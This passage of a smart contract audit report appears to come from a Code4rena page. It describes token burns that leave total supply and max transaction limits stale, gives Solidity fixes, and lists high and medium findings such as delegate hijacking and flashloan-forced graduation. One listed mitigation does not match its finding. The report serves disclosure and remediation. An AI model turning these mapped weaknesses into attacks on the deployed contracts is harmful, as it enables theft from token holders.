class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdditionally, consider using the internal \u003ccode\u003e_burn\u003c/code\u003e function that already exists in the contract to avoid code duplication:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_burn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd update the \u003ccode\u003e_burn\u003c/code\u003e function to also decrease the \u003ccode\u003etotalSupply\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_burn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add this line\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"11-wrong-max-transaction-limit-after-burns\" style=\"position:relative;\"\u003e\u003ca href=\"#11-wrong-max-transaction-limit-after-burns\" aria-label=\"11 wrong max transaction limit after burns permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[11] Wrong max transaction limit after burns\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eFERC20\u003c/code\u003e contract’s \u003ccode\u003e_maxTxAmount\u003c/code\u003e is calculated based on the initial \u003ccode\u003e_totalSupply\u003c/code\u003e and is not updated when tokens are burned. This issue is compounded by the previously reported bug where \u003ccode\u003e_totalSupply\u003c/code\u003e is not decreased during burns. Even if the total supply bug is fixed, the max transaction limit would still need to be recalculated after burns.\u003c/p\u003e\n\u003cp\u003eThe root cause is in the \u003ccode\u003e_updateMaxTx\u003c/code\u003e function, which is only called at deployment and when explicitly invoked:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTxAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMaxTxUpdated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function is not called after burns, so \u003ccode\u003e_maxTxAmount\u003c/code\u003e remains tied to the original (higher) supply, allowing disproportionately large transfers relative to the actual circulating supply.\u003c/p\u003e\n\u003ch3 id=\"impact-24\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-24\" aria-label=\"impact 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIncorrect enforcement of transaction limits, undermining tokenomics.\u003c/li\u003e\n\u003cli\u003eAnti-whale mechanisms become ineffective after burns.\u003c/li\u003e\n\u003cli\u003eUsers can transfer larger percentages of the circulating supply than intended (up to 2x the intended percentage after 50% of supply is burned).\u003c/li\u003e\n\u003cli\u003ePotential market manipulation through unexpectedly large trades.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-41\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-41\" aria-label=\"recommended mitigation steps 41 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThere are two approaches to fix this issue:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eUpdate \u003ccode\u003e_maxTxAmount\u003c/code\u003e after burns:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fix for the first bug\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Recalculate _maxTxAmount based on new supply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003eImplement proper upgrade tests that verify storage.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"1a:T25e8,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#overview\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#about-c4\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#summary\"\u003eSummary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#scope\"\u003eScope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#severity-criteria\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#high-risk-findings-6\"\u003eHigh Risk Findings (6)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies\"\u003e[H-01] Lack of access control in \u003ccode\u003eAgentNftV2::addValidator()\u003c/code\u003e enables unauthorized validator injection and causes reward accounting inconsistencies\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei\"\u003e[H-02] Anybody can control a user’s delegate by calling \u003ccode\u003eAgentVeToken.stake()\u003c/code\u003e with 1 wei\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue\"\u003e[H-03] Public \u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e call leads to cascading issue\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds\"\u003e[H-04] Public \u003ccode\u003eContributionNft::mint\u003c/code\u003e leads to cascading issues / loss of funds\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol\"\u003e[H-05] \u003ccode\u003eValidatorRegistry::validatorScore/getPastValidatorScore\u003c/code\u003e allows validator to earn full rewards without actually engaging with the protocol\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0\"\u003e[H-06] Missing \u003ccode\u003eprevAgentId\u003c/code\u003eupdate in \u003ccode\u003epromptMulti()\u003c/code\u003e function may cause token loss by transferring to \u003ccode\u003eaddress(0)\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-26\"\u003eMedium Risk Findings (26)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4\"\u003e[M-01] Attacker can prevent user from executing application registered through \u003ccode\u003einitFromToken()\u003c/code\u003e in \u003ccode\u003eAgentFactoryV4\u003c/code\u003e.\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-02-missing-slippage-protection-on-buy-and-sell\"\u003e[M-02] Missing slippage protection on buy and sell\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection\"\u003e[M-03] Slippage protection in \u003ccode\u003eAgentTax::dcaSell\u003c/code\u003e and \u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e is calculated at execution time, effectively retrieving the very same price that the trade will be executing at, ultimately providing no protection\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation\"\u003e[M-04] Launched tokens are vulnerable to flashloan attacks forcing premature graduation, allowing reward manipulation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair\"\u003e[M-05] Division in \u003ccode\u003eBonding.sol._openTradingOnUniswap()\u003c/code\u003e results in an incorrect \u003ccode\u003elpSupply\u003c/code\u003e, higher \u003ccode\u003evaultSupply\u003c/code\u003e, and dust \u003ccode\u003eAgentTokens\u003c/code\u003e getting locked in 